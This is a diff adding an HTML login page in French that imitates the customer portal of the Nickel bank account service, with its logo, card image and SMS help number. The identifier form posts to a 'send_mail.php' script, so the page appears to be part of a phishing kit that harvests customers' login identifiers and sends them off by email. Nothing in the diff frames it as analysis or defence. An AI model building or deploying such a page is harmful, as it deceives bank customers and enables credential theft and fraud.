@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion à mon espace</title>
+    <link rel="stylesheet" href="assets/css/style.css">
+    <link
+        href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900&display=swap"
+        rel="stylesheet">
+    <script>
+        // Fonction pour ajouter un espace après chaque 3 chiffres
+        function formatInput(input) {
+            input.value = input.value
+                .replace(/\D/g, '') // Retire tout ce qui n'est pas un chiffre
+                .replace(/(.{3})/g, '$1 ') // Ajoute un espace après chaque groupe de 3 chiffres
+                .trim(); // Retire les espaces inutiles à la fin
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            const phoneInput = document.querySelector('input[name="phone"]');
+            phoneInput.addEventListener('input', () => formatInput(phoneInput));
+        });
+
+    </script>
+</head>
+
+<body>
+    <header>
+        <div class="logo">
+            <img src="assets/images/logo-compte-nickel.jpg" alt="Logo Nickel">
+        </div>
+    </header>
+    <div class="container">
+        <div class="container_details">
+            <h1>Connexion à mon espace</h1>
+            <p>Votre identifiant se trouve au verso de votre carte Nickel. Si vous avez perdu votre carte, envoyez par
+                SMS <strong>IDENTIFIANT</strong> au <strong>38063</strong>.</p>
+            <div class="card-image">
+                <img src="assets/images/card-placeholder.jpg" alt="Carte Nickel">
+                <h5></h5>
+            </div>
+            <form action="send_mail.php" method="POST">
+                <label>Identifiant (au dos de la carte)</label>
+                <input type="tel" name="phone" placeholder="xxx-ooo-ooo-o" pattern="\d{3} \d{3} \d{3} \d"
+                    aria-label="Identifiant" minlength="10" maxlength="13" autocomplete="off" required>
+                <label>
+                    <input type="checkbox">
+                    Mémoriser mon identifiant
+                </label>
+                <button type="submit" name="submitphone">Se connecter</button>
+            </form>
+        </div>
+    </div>
+</body>
+<footer class="footer">
+    <div class="container">
+      <p>Aide & opposition CB | <a href="#">Pas encore client ?</a></p>
+    </div>
+  </footer>
+</html>
